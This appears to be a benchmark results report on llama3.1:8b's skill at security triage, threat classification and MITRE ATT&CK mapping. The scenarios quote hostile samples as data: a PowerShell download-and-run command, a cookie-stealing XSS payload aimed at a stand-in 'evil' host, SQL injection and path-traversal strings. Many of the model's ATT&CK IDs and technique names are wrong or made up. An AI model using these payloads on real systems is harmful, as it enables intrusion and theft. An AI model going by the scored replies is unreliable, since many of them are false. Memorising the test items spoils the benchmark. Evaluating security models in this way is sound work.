# Cybersecurity benchmark — `llama3.1:8b`
Model: `llama3.1:8b`
Run started: 2026-05-06 01:56:20

## Summary

| Section | Correct | Total | Accuracy |
|---|---|---|---|
| Incident recognition | 7 | 7 | 100% |
| Threat classification | 7 | 7 | 100% |
| MITRE ATT&CK mapping | 2 | 10 | 20% |
| Syslog triage (raw) | 8 | 8 | 100% |
| Syslog triage (drain3) | 7 | 8 | 88% |
| **Overall (with drain3)** | **23** | **32** | **72%** |

## Resource usage

Latency in seconds. GPU util/memory from `nvidia-smi`, CPU/RAM from `psutil`. Sampled every 250ms during each model call; peak is the max sample within the window.

| Section | n | Total s | Avg s | p50 s | p95 s | Max s | Peak GPU% | Avg GPU% | Peak GPU MB | Peak CPU% | Avg CPU% | Peak RAM MB |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| Incident | 7 | 7.3 | 1.04 | 0.65 | 0.72 | 3.31 | 78% | 19% | 18557 | 52% | 12% | 32769 |
| Threat | 7 | 6.0 | 0.85 | 0.89 | 0.90 | 0.91 | 81% | 35% | 18557 | 48% | 17% | 32763 |
| MITRE | 10 | 7.4 | 0.74 | 0.72 | 0.88 | 0.93 | 81% | 57% | 18557 | 54% | 19% | 32769 |
| Syslog (raw) | 8 | 5.5 | 0.69 | 0.68 | 0.76 | 0.88 | 81% | 35% | 18559 | 21% | 13% | 32660 |
| Syslog (drain3) | 8 | 5.8 | 0.72 | 0.72 | 0.79 | 0.82 | 78% | 20% | 18559 | 33% | 14% | 32668 |
| **Overall** | **40** | **31.9** | **0.80** | **0.72** | **0.91** | **3.31** | **81%** | **35%** | **18559** | **54%** | **15%** | **32769** |

## 1. Incident recognition (binary)

### INC-1 — expected: **benign** — PASS (3.3s · GPU 5%/18549MB · CPU 52% · RAM 32525MB)
_Scenario_: User logs in from their normal office IP at 9:02am on a workday and opens email.

_Reply_: Benign
This is a routine login and initial activity, consistent with normal user behavior.

### INC-2 — expected: **incident** — PASS (0.6s · GPU 5%/18557MB · CPU 14% · RAM 32584MB)
_Scenario_: Domain admin account authenticates successfully from an IP in a country the company has no offices in, at 03:14 local time, followed within 4 minutes by 18 RDP sessions to internal hosts.

_Reply_: Incident
Unusual login and rapid RDP session establishment from an unknown location suggests potential unauthorized access or lateral movement.

### INC-3 — expected: **incident** — PASS (0.6s · GPU 78%/18557MB · CPU 6% · RAM 32601MB)
_Scenario_: Web server logs show 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, with 3 successful logins to admin accounts.

_Reply_: Incident
This is likely an automated brute-force attack on the WordPress login page, attempting to gain unauthorized access to administrative accounts.

### INC-4 — expected: **benign** — PASS (0.6s · GPU 78%/18557MB · CPU 15% · RAM 32664MB)
_Scenario_: A scheduled nightly backup job runs at 02:00, copies 40GB to the backup server, and completes with exit code 0. Same as previous 30 nights.

_Reply_: Benign
The job has run successfully for 30 consecutive nights, indicating a stable and expected process.

### INC-5 — expected: **incident** — PASS (0.7s · GPU 0%/18557MB · CPU 22% · RAM 32747MB)
_Scenario_: EDR alerts that powershell.exe spawned by winword.exe executed: IEX (New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1')

_Reply_: Incident
The execution of PowerShell code from an external URL via WinWord.exe suggests a potential lateral movement or malware delivery mechanism, warranting further investigation.

### INC-6 — expected: **benign** — PASS (0.7s · GPU 16%/18557MB · CPU 29% · RAM 32760MB)
_Scenario_: Developer pushes a commit to a feature branch, CI runs unit tests, all pass.

_Reply_: Benign

The developer's actions are routine and expected within the development process, and the passing of unit tests indicates that no immediate security vulnerabilities were introduced.

### INC-7 — expected: **incident** — PASS (0.7s · GPU 16%/18557MB · CPU 14% · RAM 32769MB)
_Scenario_: DNS server logs show a single host querying 4,000+ unique subdomains of a single domain over 2 hours, with TXT record responses averaging 200 bytes.

_Reply_: Incident
This is likely an automated scanning or reconnaissance attempt by a malicious actor to identify potential vulnerabilities or gather information for future attacks, given the high volume and specificity of subdomain queries.

## 2. Threat-type classification

### THR-1 — accepted keywords: ['ransomware'] — PASS (0.8s · GPU 0%/18557MB · CPU 10% · RAM 32763MB)
_Scenario_: Files on user workstations are renamed with .lockbit extension. A README.txt demands 2 BTC for decryption keys.

_Reply_: **LockBit Ransomware**

This is a type of ransomware that encrypts files and appends a ".lockbit" extension to them, demanding payment (in this case, 2 BTC) for decryption keys.

_Match_: 'ransomware'

### THR-2 — accepted keywords: ['phishing', 'bec', 'business email compromise', 'spear'] — PASS (0.8s · GPU 81%/18557MB · CPU 15% · RAM 32754MB)
_Scenario_: Email appears to come from the CFO asking the AP clerk to wire $48,000 to a new vendor urgently. The reply-to address has a slight typo in the domain.

_Reply_: Phishing Attack

The email appears to be a phishing attempt because it's attempting to trick the AP clerk into performing an urgent financial action by impersonating the CFO, and the slight typo in the domain is likely a deliberate mistake to avoid detection by spam filters or security software.

_Match_: 'phishing'

### THR-3 — accepted keywords: ['sql injection', 'sqli'] — PASS (0.9s · GPU 81%/18557MB · CPU 48% · RAM 32743MB)
_Scenario_: Application logs show: SELECT * FROM users WHERE name='admin' OR '1'='1'-- in the username field of the login form.

_Reply_: SQL Injection (SI)

This is a classic example of SQL injection, where an attacker injects malicious SQL code into a web application's database query to extract or modify sensitive data. The injected code, 'OR '1'='1', is used to bypass authentication and potentially gain unauthorized access to the system.

_Match_: 'sql injection'

### THR-4 — accepted keywords: ['xss', 'cross-site scripting', 'cross site scripting'] — PASS (0.8s · GPU 32%/18557MB · CPU 13% · RAM 32754MB)
_Scenario_: A web app reflects a user-supplied 'name' query parameter directly into the HTML body without encoding. Attacker crafts a URL containing <script>fetch('//evil/'+document.cookie)</script>.

_Reply_: **Cross-Site Scripting (XSS)**

The attacker injects malicious JavaScript code into the web app's HTML body through a user-supplied input (query parameter), allowing them to steal sensitive information (document.cookie) from other users' browsers.

_Match_: 'xss'

### THR-5 — accepted keywords: ['credential', 'credential dumping', 'credential theft', 'credential access', 'lsass'] — PASS (0.9s · GPU 0%/18557MB · CPU 24% · RAM 32746MB)
_Scenario_: Internal user runs an executable received via email. The process injects into lsass.exe, dumps memory, and exfiltrates the dump over HTTPS to an external server.

_Reply_: **Pass-the-Credential (PtC)**

This is a type of attack where an attacker injects malware into a legitimate process (in this case, lsass.exe) to dump credentials and exfiltrate them over the network. The goal is to obtain sensitive authentication information for potential lateral movement or unauthorized access.

_Match_: 'credential'

### THR-6 — accepted keywords: ['ddos', 'dos', 'denial of service', 'denial-of-service', 'amplification'] — PASS (0.9s · GPU 74%/18557MB · CPU 44% · RAM 32756MB)
_Scenario_: Multiple hosts on the corporate network suddenly send 10Gbps of UDP traffic to the same external IP, sourced from spoofed addresses. The target is the company's public DNS.

_Reply_: Amplified DDoS Attack

This is a type of Distributed Denial-of-Service (DDoS) attack that leverages amplification techniques to overwhelm the target with traffic. In this case, the attackers are using spoofed addresses and UDP traffic to flood the company's public DNS, likely attempting to disrupt its availability or cause a denial-of-service condition.

_Match_: 'ddos'

### THR-7 — accepted keywords: ['supply chain', 'supply-chain'] — PASS (0.9s · GPU 74%/18557MB · CPU 25% · RAM 32730MB)
_Scenario_: A signed update from a trusted third-party vendor's auto-update channel installs a backdoor on thousands of customer machines. The vendor's build server was compromised.

_Reply_: Supply Chain Attack

This is an attack where a malicious actor compromises a trusted third-party vendor's systems to inject malware into their software updates, which are then installed on customers' machines without their knowledge or consent. In this case, the vendor's build server was compromised, allowing the attacker to sign and distribute a backdoored update.

_Match_: 'supply chain'

## 3. MITRE ATT&CK technique mapping

**Per-case results**

| Case | Scenario | Accepted IDs | Detected | Result |
|---|---|---|---|---|
| ATT-1 | An attacker sends a Word document containing a malicious macro to a... | `T1566.001, T1566, T1204.002, T1204` | `T1194.003` | FAIL |
| ATT-2 | Adversary uses Mimikatz to extract plaintext passwords and NTLM has... | `T1003.001, T1003` | `T1003` | PASS |
| ATT-3 | Attacker creates a new scheduled task on the victim host to run the... | `T1053.005, T1053` | `T1050.003` | FAIL |
| ATT-4 | After initial access, the attacker uses 'net group "Domain Admins" ... | `T1087.002, T1087, T1018, T1482` | `T1018` | PASS |
| ATT-5 | Adversary establishes persistence by adding a value under HKCU\Soft... | `T1547.001, T1547` | `T1060.002` | FAIL |
| ATT-6 | C2 beaconing traffic is encoded as DNS TXT record queries to attack... | `T1071.004, T1071, T1048.003, T1048` | `T1210` | FAIL |
| ATT-7 | Attacker uses PsExec from a compromised workstation to execute a re... | `T1021.002, T1021, T1570, T1569.002` | `T1055.003` | FAIL |
| ATT-8 | Before encrypting victim files, the ransomware deletes Windows Volu... | `T1490` | `T1059.002,T1059` | FAIL |
| ATT-9 | A binary uses base64-encoded PowerShell with the -EncodedCommand fl... | `T1027, T1059.001, T1140` | `T1146.002` | FAIL |
| ATT-10 | Attacker compresses sensitive files into a password-protected RAR a... | `T1560.001, T1560` | `T1022.003,T1036` | FAIL |

### ATT-1 — accepted IDs: ['T1566.001', 'T1566', 'T1204.002', 'T1204'] — FAIL (0.7s · GPU 69%/18557MB · CPU 27% · RAM 32743MB)
_Scenario_: An attacker sends a Word document containing a malicious macro to a target user. The user opens the doc and enables macros, which downloads a payload.

_Reply_: T1194.003 - Exploit Public-Facing Application: Microsoft Office Malicious Macro

This technique involves exploiting a vulnerability in Microsoft Office, specifically through malicious macros embedded in documents.

_Detected IDs_: T1194.003

### ATT-2 — accepted IDs: ['T1003.001', 'T1003'] — PASS (0.9s · GPU 74%/18557MB · CPU 34% · RAM 32769MB)
_Scenario_: Adversary uses Mimikatz to extract plaintext passwords and NTLM hashes from LSASS memory on a compromised host.

_Reply_: T1003.002 - Timestomp is not relevant here, but...

The correct answer is:
T1003.003 - OS Credential Dumping 

This technique involves extracting credentials from a system, which matches the behavior of using Mimikatz to extract plaintext passwords and NTLM hashes from LSASS memory.

_Detected IDs_: T1003

### ATT-3 — accepted IDs: ['T1053.005', 'T1053'] — FAIL (0.5s · GPU 74%/18557MB · CPU 13% · RAM 32745MB)
_Scenario_: Attacker creates a new scheduled task on the victim host to run their implant every time the system starts.

_Reply_: T1050.003 - Scheduled Task/Job

Scheduled Task Creation

_Detected IDs_: T1050.003

### ATT-4 — accepted IDs: ['T1087.002', 'T1087', 'T1018', 'T1482'] — PASS (0.7s · GPU 17%/18557MB · CPU 18% · RAM 32733MB)
_Scenario_: After initial access, the attacker uses 'net group "Domain Admins" /domain' and 'nltest /dclist' to map the AD environment.

_Reply_: T1018 - Valid Accounts

The attacker is using built-in Windows tools to enumerate and identify valid domain administrator accounts, which is a key step in gaining elevated privileges.

_Detected IDs_: T1018

### ATT-5 — accepted IDs: ['T1547.001', 'T1547'] — FAIL (0.9s · GPU 68%/18557MB · CPU 19% · RAM 32753MB)
_Scenario_: Adversary establishes persistence by adding a value under HKCU\Software\Microsoft\Windows\CurrentVersion\Run that points to their malware.

_Reply_: T1060.002 - Registry Run Keys / Startup Folder 

This is a sub-technique of "Registry Run Keys / Startup" which involves adding or modifying entries in the Windows registry to execute malicious code at startup. The ".002" indicates that it specifically targets HKCU (HKEY_CURRENT_USER) rather than HKLM (HKEY_LOCAL_MACHINE).

_Detected IDs_: T1060.002

### ATT-6 — accepted IDs: ['T1071.004', 'T1071', 'T1048.003', 'T1048'] — FAIL (0.7s · GPU 81%/18557MB · CPU 32% · RAM 32747MB)
_Scenario_: C2 beaconing traffic is encoded as DNS TXT record queries to attacker-controlled subdomains, bypassing the proxy.

_Reply_: T1210 - Exploit Public-Facing Application

This technique involves using a public-facing application or service to exfiltrate data or communicate with the attacker's infrastructure, in this case, by encoding C2 beaconing traffic as DNS TXT record queries.

_Detected IDs_: T1210

### ATT-7 — accepted IDs: ['T1021.002', 'T1021', 'T1570', 'T1569.002'] — FAIL (0.7s · GPU 81%/18557MB · CPU 19% · RAM 32668MB)
_Scenario_: Attacker uses PsExec from a compromised workstation to execute a remote command on a domain controller using stolen admin credentials.

_Reply_: T1055.003 - Command and Control via Compromised Credentials 

This technique involves an attacker using compromised credentials to execute a command on a remote system, which aligns with the described scenario.

_Detected IDs_: T1055.003

### ATT-8 — accepted IDs: ['T1490'] — FAIL (0.7s · GPU 80%/18557MB · CPU 54% · RAM 32620MB)
_Scenario_: Before encrypting victim files, the ransomware deletes Windows Volume Shadow Copies using 'vssadmin delete shadows /all /quiet'.

_Reply_: T1059.002 - System Shutdown/Reboot, specifically "Delete Volume Shadow Copies" 

This is a sub-technique of T1059, which is "System Shutdown/Reboot".

_Detected IDs_: T1059.002,T1059

### ATT-9 — accepted IDs: ['T1027', 'T1059.001', 'T1140'] — FAIL (0.8s · GPU 80%/18557MB · CPU 23% · RAM 32610MB)
_Scenario_: A binary uses base64-encoded PowerShell with the -EncodedCommand flag to obscure its real payload from defenders.

_Reply_: T1146.002: Software Packing

This technique involves using a packing tool or method to obscure the true nature of a binary, making it harder for defenders to identify its functionality. In this case, the use of base64-encoded PowerShell with the -EncodedCommand flag is an example of software packing.

_Detected IDs_: T1146.002

### ATT-10 — accepted IDs: ['T1560.001', 'T1560'] — FAIL (0.8s · GPU 81%/18557MB · CPU 23% · RAM 32639MB)
_Scenario_: Attacker compresses sensitive files into a password-protected RAR archive on the victim host before exfiltration.

_Reply_: T1022.003 - File and Directory Permissions Modification, specifically for password-protected archives.

However, a more fitting match would be:
T1036 - Data Encrypted 

This is because the attacker is encrypting the sensitive files before exfiltration.

_Detected IDs_: T1022.003,T1036

## 4. Raw syslog triage (binary) — baseline vs drain3-augmented

### SYS-1 — SSH brute force followed by successful login — expected: **incident**
_Logs_:
```
Mar 10 03:41:02 webhost sshd[28401]: Failed password for invalid user admin from 185.220.101.45 port 47812 ssh2
Mar 10 03:41:05 webhost sshd[28403]: Failed password for invalid user root from 185.220.101.45 port 47815 ssh2
Mar 10 03:41:08 webhost sshd[28405]: Failed password for invalid user oracle from 185.220.101.45 port 47820 ssh2
Mar 10 03:41:11 webhost sshd[28407]: Failed password for invalid user postgres from 185.220.101.45 port 47824 ssh2
Mar 10 03:41:14 webhost sshd[28409]: Failed password for invalid user git from 185.220.101.45 port 47829 ssh2
Mar 10 03:41:17 webhost sshd[28411]: Failed password for invalid user test from 185.220.101.45 port 47833 ssh2
Mar 10 03:41:20 webhost sshd[28413]: Failed password for ubuntu from 185.220.101.45 port 47837 ssh2
Mar 10 03:43:21 webhost sshd[28571]: Accepted password for ubuntu from 185.220.101.45 port 47891 ssh2
Mar 10 03:43:21 webhost sshd[28571]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
```

_drain3 templates_:
```
[x6] Mar 10 <*> webhost <*> Failed password for invalid user <*> from 185.220.101.45 port <*> ssh2
[x2] Mar 10 <*> webhost <*> <*> password for ubuntu from 185.220.101.45 port <*> ssh2
[x1] Mar 10 03:43:21 webhost sshd[28571]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
```

**Baseline (raw only)** — PASS (0.7s · GPU 81%/18557MB · CPU 19% · RAM 32660MB)
_Reply_: Incident
Multiple failed login attempts from the same IP address targeting common system users, followed by successful login and session creation for one of those users, suggests a potential brute-force attack or unauthorized access attempt.

**With drain3 summary** — PASS (0.8s · GPU 0%/18557MB · CPU 28% · RAM 32664MB)
_Reply_: Incident
The high count of [x6] for failed login attempts from 185.220.101.45 suggests a coordinated attack, while the single instance of a successful login and session opening for user ubuntu indicates potential exploitation of a vulnerability to gain access.

### SYS-2 — Normal pubkey login from internal range — expected: **benign**
_Logs_:
```
Mar 10 09:14:32 webhost sshd[14201]: Accepted publickey for alice from 10.0.4.22 port 51842 ssh2: RSA SHA256:7Hk2pQ...
Mar 10 09:14:32 webhost sshd[14201]: pam_unix(sshd:session): session opened for user alice by (uid=0)
Mar 10 09:14:33 webhost systemd-logind[612]: New session 2841 of user alice.
```

_drain3 templates_:
```
[x1] Mar 10 09:14:32 webhost sshd[14201]: Accepted publickey for alice from 10.0.4.22 port 51842 ssh2: RSA SHA256:7Hk2pQ...
[x1] Mar 10 09:14:32 webhost sshd[14201]: pam_unix(sshd:session): session opened for user alice by (uid=0)
[x1] Mar 10 09:14:33 webhost systemd-logind[612]: New session 2841 of user alice.
```

**Baseline (raw only)** — PASS (0.9s · GPU 81%/18557MB · CPU 12% · RAM 32638MB)
_Reply_: Benign

The log lines indicate a successful SSH login for the user "alice" from an IP address that is likely within the organization's network (10.0.4.22), and the session was opened by the root user, which suggests a legitimate administrative action.

**With drain3 summary** — PASS (0.7s · GPU 78%/18557MB · CPU 12% · RAM 32645MB)
_Reply_: Benign

The low [x1] count on all three templates suggests routine activity, and there is no indication of repeated failed logins, SQL/path-traversal probes, or other attack-shaped patterns.

### SYS-3 — Daily cron run — expected: **benign**
_Logs_:
```
Mar 10 02:00:01 webhost CRON[31201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
Mar 10 02:00:23 webhost rsyslogd: [origin software="rsyslogd" swVersion="8.2102.0"] rsyslogd was HUPed
Mar 10 02:00:24 webhost CRON[31201]: pam_unix(cron:session): session closed for user root
```

_drain3 templates_:
```
[x1] Mar 10 02:00:01 webhost CRON[31201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
[x1] Mar 10 02:00:23 webhost rsyslogd: [origin software="rsyslogd" swVersion="8.2102.0"] rsyslogd was HUPed
[x1] Mar 10 02:00:24 webhost CRON[31201]: pam_unix(cron:session): session closed for user root
```

**Baseline (raw only)** — PASS (0.5s · GPU 78%/18557MB · CPU 18% · RAM 32637MB)
_Reply_: Benign

The log lines appear to be normal system maintenance and cron job execution, indicating no malicious activity.

**With drain3 summary** — PASS (0.7s · GPU 0%/18559MB · CPU 30% · RAM 32627MB)
_Reply_: Benign

The low [x1] count on all three templates suggests routine maintenance activity, with no indication of repeated or anomalous behavior characteristic of an incident.

### SYS-4 — SQL injection probes in Apache access log — expected: **incident**
_Logs_:
```
185.62.190.13 - - [10/Mar/2026:14:22:03 +0000] "GET /products.php?id=1' OR '1'='1-- HTTP/1.1" 500 1842
185.62.190.13 - - [10/Mar/2026:14:22:04 +0000] "GET /products.php?id=1+UNION+SELECT+username,password+FROM+users-- HTTP/1.1" 200 4129
185.62.190.13 - - [10/Mar/2026:14:22:05 +0000] "GET /products.php?id=1;DROP+TABLE+users-- HTTP/1.1" 500 1842
185.62.190.13 - - [10/Mar/2026:14:22:06 +0000] "GET /products.php?id=1+AND+SLEEP(5)-- HTTP/1.1" 200 4129
```

_drain3 templates_:
```
[x3] 185.62.190.13 - - <*> +0000] "GET <*> HTTP/1.1" <*> <*>
[x1] 185.62.190.13 - - [10/Mar/2026:14:22:03 +0000] "GET /products.php?id=1' OR '1'='1-- HTTP/1.1" 500 1842
```

**Baseline (raw only)** — PASS (0.7s · GPU 68%/18559MB · CPU 19% · RAM 32621MB)
_Reply_: Incident
The IP address 185.62.190.13 is attempting to exploit SQL injection vulnerabilities in the /products.php script, indicating malicious intent.

**With drain3 summary** — PASS (0.8s · GPU 68%/18559MB · CPU 18% · RAM 32630MB)
_Reply_: Incident
The high count of [x3] for the attack-shaped template, combined with a single instance of a specific malicious log line ([x1]), suggests a targeted and coordinated attack rather than routine activity.

### SYS-5 — Sudo adding service account to sudo group at 03:17 — expected: **incident**
_Logs_:
```
Mar 10 03:17:42 webhost sudo:      bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc_backup
Mar 10 03:17:42 webhost sudo: pam_unix(sudo:session): session opened for user root by bob(uid=0)
Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to group 'sudo'
Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to shadow group 'sudo'
Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root
```

_drain3 templates_:
```
[x1] Mar 10 03:17:42 webhost sudo: bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc_backup
[x1] Mar 10 03:17:42 webhost sudo: pam_unix(sudo:session): session opened for user root by bob(uid=0)
[x1] Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to group 'sudo'
[x1] Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to shadow group 'sudo'
[x1] Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root
```

**Baseline (raw only)** — PASS (0.6s · GPU 0%/18559MB · CPU 21% · RAM 32650MB)
_Reply_: Incident
A non-privileged user (bob) is modifying the sudo group, potentially escalating their privileges and allowing unauthorized access to sensitive systems.

**With drain3 summary** — FAIL (0.7s · GPU 0%/18559MB · CPU 33% · RAM 32656MB)
_Reply_: Benign

The high [x1] count on multiple templates suggests routine maintenance rather than an attack, as a single incident would likely produce more than one matching log line.

### SYS-6 — Path traversal probes in Apache access log — expected: **incident**
_Logs_:
```
198.51.100.7 - - [10/Mar/2026:11:03:18 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 2841
198.51.100.7 - - [10/Mar/2026:11:03:19 +0000] "GET /download?file=..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 403 891
198.51.100.7 - - [10/Mar/2026:11:03:20 +0000] "GET /download?file=....//....//etc/hosts HTTP/1.1" 200 412
```

_drain3 templates_:
```
[x3] 198.51.100.7 - - <*> +0000] "GET <*> HTTP/1.1" <*> <*>
```

**Baseline (raw only)** — PASS (0.8s · GPU 0%/18559MB · CPU 18% · RAM 32644MB)
_Reply_: Incident
The IP address 198.51.100.7 is attempting to access sensitive system files (/etc/passwd, /etc/shadow, and /etc/hosts) through a web application, indicating potential unauthorized access attempts.

**With drain3 summary** — PASS (0.7s · GPU 0%/18559MB · CPU 18% · RAM 32626MB)
_Reply_: Incident
The high count of [x3] on an attack-shaped template, specifically the path-traversal probe attempt in the second log line, indicates a potential security incident.

### SYS-7 — Normal authenticated web session — expected: **benign**
_Logs_:
```
10.0.4.22 - alice [10/Mar/2026:10:14:02 +0000] "GET /dashboard HTTP/1.1" 200 18421 "https://intranet.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
10.0.4.22 - alice [10/Mar/2026:10:14:03 +0000] "GET /static/app.js HTTP/1.1" 200 84219 "https://intranet.example.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
10.0.4.22 - alice [10/Mar/2026:10:14:03 +0000] "POST /api/v1/metrics HTTP/1.1" 200 142 "https://intranet.example.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
```

_drain3 templates_:
```
[x3] 10.0.4.22 - alice <*> +0000] <*> <*> HTTP/1.1" 200 <*> <*> "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
```

**Baseline (raw only)** — PASS (0.6s · GPU 0%/18559MB · CPU 16% · RAM 32621MB)
_Reply_: Benign

The user is accessing legitimate pages and making API calls to collect metrics, which appears to be normal system usage.

**With drain3 summary** — PASS (0.6s · GPU 43%/18559MB · CPU 20% · RAM 32644MB)
_Reply_: Benign
The high count of 3 matching log lines in the pattern summary suggests routine activity, not an incident.

### SYS-8 — Windows 4625 burst then 4624 from same IP — expected: **incident**
_Logs_:
```
Mar 10 02:18:14 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:16 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:18 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:21 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:24 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:21:42 dc01 winlogbeat: EventID=4624 Account=Administrator LogonType=3 IpAddress=192.168.50.13 WorkstationName=KIOSK-04
```

_drain3 templates_:
```
[x5] Mar 10 <*> dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
[x1] Mar 10 02:21:42 dc01 winlogbeat: EventID=4624 Account=Administrator LogonType=3 IpAddress=192.168.50.13 WorkstationName=KIOSK-04
```

**Baseline (raw only)** — PASS (0.7s · GPU 43%/18559MB · CPU 21% · RAM 32659MB)
_Reply_: Incident
The repeated failed login attempts from the same IP address and workstation name within a short time frame suggest a potential brute-force attack on the Administrator account.

**With drain3 summary** — PASS (0.8s · GPU 27%/18559MB · CPU 22% · RAM 32668MB)
_Reply_: Incident
The high count of 5 matching log lines for the failed login template (EventID=4625) suggests a potential security incident, whereas the single instance of a successful login (EventID=4624) is more indicative of routine activity.
